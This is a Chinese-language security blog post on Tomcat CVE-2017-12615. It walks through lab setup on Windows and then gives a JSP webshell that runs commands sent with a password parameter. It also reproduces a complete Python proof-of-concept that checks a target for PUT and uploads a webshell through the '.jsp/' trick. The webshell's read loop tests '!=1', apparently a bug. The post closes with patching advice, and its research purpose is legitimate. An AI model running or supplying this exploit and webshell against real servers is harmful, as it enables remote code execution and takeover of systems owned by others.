---
title: Tomcat CVE-2017-12615 远程代码执行漏洞
date: 2017-09-21 18:13:23
tags:
		- Tomcat
categories:
		- 安全研究
---

Tomcat CVE-2017-12615 远程代码执行漏洞的简单研究。

<!-- more -->


__下载安装jdk__

	http://js.9553.com/soft/jdk-8u66-windows-i586-20151102.rar

__环境配置__

新建2个变量，编辑一个变量，分别填入一下信息

	系统变量里面

	新建：
	
	变量名:JAVA_HOME
	
	变量值:你的JDK安装目录\jdk1.7.0
	
	 
	
	变量名:CLASSPATH
	
	变量值:.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;%TOMCAT_HOME%\BIN
	
	（注意最前面有个.号）
	
	 
	
	编辑：
	
	变量名:Path
	
	变量值:%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;
	
	 (将此处的字符串粘帖到变量值的最前面)



在开始运行输入CMD，在命令行里分别输入java; javac; java -version，显示信息，说明java环境配置成功。

__tomcat__

	http://tomcat.apache.org/download-70.cgi


>zip、tar.gz和Windows Service Installer三种安装包，其中： 
Zip是Windows下的免安装版本，只需要解压后做一定的手动配置就可以正常的使用； 
tar.gz是Linux下的安装包； 
Windows Service Installer很明显就是Windows下的Install程序，双击后就可以自动安装了



变量名:TOMCAT_HOME

变量值:你的TOMCAT所在目录   
如：E:\apache-tomcat-7.0.26


__tomcat配置__

修改默认访问端口

	E:\tomcat\conf\server.xml

修改为9090


 	<Connector port="9090" protocol="HTTP/1.1"
               connectionTimeout="20000"
               redirectPort="8443" />



----------


#### Tomcat 代码执行漏洞分析

修改配置文件 `E:\tomcat\conf\server.xml`


添加以下内容

	<init-param>
            <param-name>readonly</param-name>
            <param-value>false</param-value>
        </init-param>


#### 漏洞利用条件

CVE-2017-12615 需要将readonly初始化参数由默认值设置为false。但是Tomcat7.x版本中的`web.xml`配置文件中没有`readonly`参数，需要手工添加，默认配置不受此漏洞影响。





__版本--7.0.81__


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/6879452.jpg)

上传的时候出现，403禁止。。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/49583998.jpg)


__版本--7.0.79__

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/71751989.jpg)


* put请求，上传内容

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/68481146.jpg)

* 访问

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/13765510.jpg)

* 上传一木马

		<%
	    if("023".equals(request.getParameter("pwd"))){
	        java.io.InputStream in = 
	            Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
	            int a = -1;
	            byte[] b = new byte[2048];
	            out.print("<pre>");
	            while((a=in.read(b)) !=1){
		                out.println(new String(b));
	            }
	            out.print("</pre>");
	    }
		%>
	


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/96541990.jpg)


##### POC

[CVE-2017-12615.py](https://github.com/fupinglee/MyPython/blob/92394ff98b02c1d81361ce2d5ae9f53f527a2a6b/exploit/CVE-2017-12615/CVE-2017-12615.py)

使用了`httplib`模块。对其中的几句代码不是很理解，单独测试一下。

	>>> conn = httplib.HTTPConnection('192.168.86.194',9090)
	>>> conn.request(method='OPTIONS',url='/fffzz')
	>>> a = conn.getresponse()
	>>> a
	<httplib.HTTPResponse instance at 0x0000000002612188>
	>>> a.getheaders()
	[('date', 'Thu, 21 Sep 2017 08:39:26 GMT'), ('content-length', '0'), ('allow', '
	GET, HEAD, POST, PUT, DELETE, OPTIONS'), ('server', 'Apache-Coyote/1.1')]

`OPTIONS`

> 这个方法会请求服务器返回该资源所支持的所有HTTP请求方法，该方法会用'*'来代替资源名称，向服务器发送OPTIONS请求，可以测试服务器功能是否正常。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/13222151.jpg)

	#!/usr/bin/python
	# -*- coding:utf-8 -*-
	#__author__="浮萍"
	
	import httplib
	import sys
	import time
	
	#恶意代码
	body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
	+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''
	
	try:
	    conn = httplib.HTTPConnection(sys.argv[1])  # 第一个参数为目标地址
	    conn.request(method='OPTIONS',url='/ffffzz')
	    headers = dict(conn.getresponse().getheaders())
	    if 'allow' in headers and headers['allow'].find('PUT') > 0:
	        conn.close()
	        conn = httplib.HTTPConnection(sys.argv[1])
	        url = "/" + str(int(time.time())) + '.jsp/'
	        #url = "/" + str(int(time.time())) + '.jsp::$DATA'
	        conn.request(method='PUT',url=url,body=body)
	        res = conn.getresponse()
	        if res.status == 201:
	            print 'shell:', 'http://' + sys.argv[1] + url[:-1]
	        elif res.status == '204':
	            print 'file exists'
	        else:
	            print 'error'
	        conn.close()
	        
	    else:
	        print 'Server not vulnerable'
	        
	except Exception,e:
	    print 'Error:',e

##### 修复建议

1. 升级到Apache Tomcat 最新的版本
2. 将`conf\web.xml`中的`<init-param>
            <param-name>readonly</param-name>
            <param-value>true</param-value>
        </init-param>`

设置为`true`，其实默认的就是`true`。






##### 参考

[https://tomcat.apache.org/security-7.html](https://tomcat.apache.org/security-7.html)

[https://mp.weixin.qq.com/s/-dgcKKCjT8C2yDxMOXDyLA](https://mp.weixin.qq.com/s/-dgcKKCjT8C2yDxMOXDyLA)

[https://www.secfree.com/article-399.html](https://www.secfree.com/article-399.html)



